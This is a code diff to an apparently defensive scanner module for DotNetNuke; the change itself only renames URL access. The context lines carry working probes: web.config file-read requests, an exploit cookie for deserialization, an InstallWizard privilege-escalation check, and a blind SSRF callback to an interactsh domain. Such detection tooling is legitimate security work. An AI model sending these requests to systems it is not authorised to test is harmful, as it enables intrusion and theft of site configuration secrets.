@@ -47,7 +47,7 @@ class dotnetnuke(BaseModule):
                 event = self.interactsh_subdomain_tags.get(full_id.split(".")[0])
                 if not event:
                     return
-                url = event.data["url"]
+                url = event.url
                 description = "DotNetNuke Blind-SSRF (CVE 2017-0929)"
                 await self.emit_event(
                     {
@@ -74,7 +74,7 @@ class dotnetnuke(BaseModule):
         if raw_headers:
             for header_signature in self.DNN_signatures_header:
                 if header_signature in raw_headers:
-                    url = event.data["url"]
+                    url = event.url
                     await self.emit_event(
                         {"technology": "DotNetNuke", "url": url, "host": str(event.host)},
                         "TECHNOLOGY",
@@ -88,17 +88,17 @@ class dotnetnuke(BaseModule):
             for body_signature in self.DNN_signatures_body:
                 if body_signature in resp_body:
                     await self.emit_event(
-                        {"technology": "DotNetNuke", "url": event.data["url"], "host": str(event.host)},
+                        {"technology": "DotNetNuke", "url": event.url, "host": str(event.host)},
                         "TECHNOLOGY",
                         event,
-                        context=f"{{module}} scanned {event.data['url']} and found {{event.type}}: DotNetNuke",
+                        context=f"{{module}} scanned {event.url} and found {{event.type}}: DotNetNuke",
                     )
                     detected = True
                     break
 
         if detected is True:
             # DNNPersonalization Deserialization Detection
-            for probe_url in [f"{event.data['url']}/__", f"{event.data['url']}/", f"{event.data['url']}"]:
+            for probe_url in [f"{event.url}/__", f"{event.url}/", f"{event.url}"]:
                 result = await self.helpers.request(probe_url, cookies=self.exploit_probe)
                 if result:
                     if "for 16-bit app support" in result.text and "[extensions]" in result.text:
@@ -120,7 +120,7 @@ class dotnetnuke(BaseModule):
             if "endpoint" not in event.tags:
                 # NewsArticlesSlider ImageHandler.ashx File Read
                 result = await self.helpers.request(
-                    f"{event.data['url']}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config"
+                    f"{event.url}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config"
                 )
                 if result:
                     if "<configuration>" in result.text:
@@ -132,16 +132,16 @@ class dotnetnuke(BaseModule):
                                 "description": description,
                                 "name": "DotNetNuke Arbitrary File Read",
                                 "host": str(event.host),
-                                "url": f"{event.data['url']}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx",
+                                "url": f"{event.url}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx",
                             },
                             "FINDING",
                             event,
-                            context=f"{{module}} scanned {event.data['url']} and found critical {{event.type}}: {description}",
+                            context=f"{{module}} scanned {event.url} and found critical {{event.type}}: {description}",
                         )
 
                 # DNNArticle GetCSS.ashx File Read
                 result = await self.helpers.request(
-                    f"{event.data['url']}/DesktopModules/DNNArticle/getcss.ashx?CP=%2fweb.config&smid=512&portalid=3"
+                    f"{event.url}/DesktopModules/DNNArticle/getcss.ashx?CP=%2fweb.config&smid=512&portalid=3"
                 )
                 if result:
                     if "<configuration>" in result.text:
@@ -153,19 +153,19 @@ class dotnetnuke(BaseModule):
                                 "description": description,
                                 "name": "DotNetNuke Arbitrary File Read",
                                 "host": str(event.host),
-                                "url": f"{event.data['url']}/Desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config",
+                                "url": f"{event.url}/Desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config",
                             },
                             "FINDING",
                             event,
-                            context=f"{{module}} scanned {event.data['url']} and found critical {{event.type}}: {description}",
+                            context=f"{{module}} scanned {event.url} and found critical {{event.type}}: {description}",
                         )
 
                 # InstallWizard SuperUser Privilege Escalation
-                result = await self.helpers.request(f"{event.data['url']}/Install/InstallWizard.aspx")
+                result = await self.helpers.request(f"{event.url}/Install/InstallWizard.aspx")
                 if result:
                     if result.status_code == 200:
                         result_confirm = await self.helpers.request(
-                            f"{event.data['url']}/Install/InstallWizard.aspx?__viewstate=1"
+                            f"{event.url}/Install/InstallWizard.aspx?__viewstate=1"
                         )
                         if result_confirm.status_code == 500:
                             description = "DotNetNuke InstallWizard SuperUser Privilege Escalation"
@@ -176,22 +176,22 @@ class dotnetnuke(BaseModule):
                                     "description": description,
                                     "name": "DotNetNuke Privilege Escalation",
                                     "host": str(event.host),
-                                    "url": f"{event.data['url']}/Install/InstallWizard.aspx",
+                                    "url": f"{event.url}/Install/InstallWizard.aspx",
                                 },
                                 "FINDING",
                                 event,
-                                context=f"{{module}} scanned {event.data['url']} and found critical {{event.type}}: {description}",
+                                context=f"{{module}} scanned {event.url} and found critical {{event.type}}: {description}",
                             )
                             return
 
                 # DNNImageHandler.ashx Blind SSRF
-                self.event_dict[event.data["url"]] = event
+                self.event_dict[event.url] = event
                 if self.interactsh_instance:
                     subdomain_tag = self.helpers.rand_string(4, digits=False)
                     self.interactsh_subdomain_tags[subdomain_tag] = event
 
                     await self.helpers.request(
-                        f"{event.data['url']}/DnnImageHandler.ashx?mode=file&url=http://{subdomain_tag}.{self.interactsh_domain}"
+                        f"{event.url}/DnnImageHandler.ashx?mode=file&url=http://{subdomain_tag}.{self.interactsh_domain}"
                     )
                 else:
                     self.debug(
